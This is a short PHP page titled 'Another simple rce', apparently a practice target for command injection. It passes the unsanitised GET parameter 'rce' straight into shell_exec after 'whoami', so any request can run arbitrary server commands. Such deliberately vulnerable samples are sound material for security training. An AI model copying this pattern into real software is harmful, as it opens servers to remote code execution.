<h2>Another simple rce</h2>
<?php 
$rce = $_GET['rce'];
echo shell_exec('whoami'.$rce);
?>
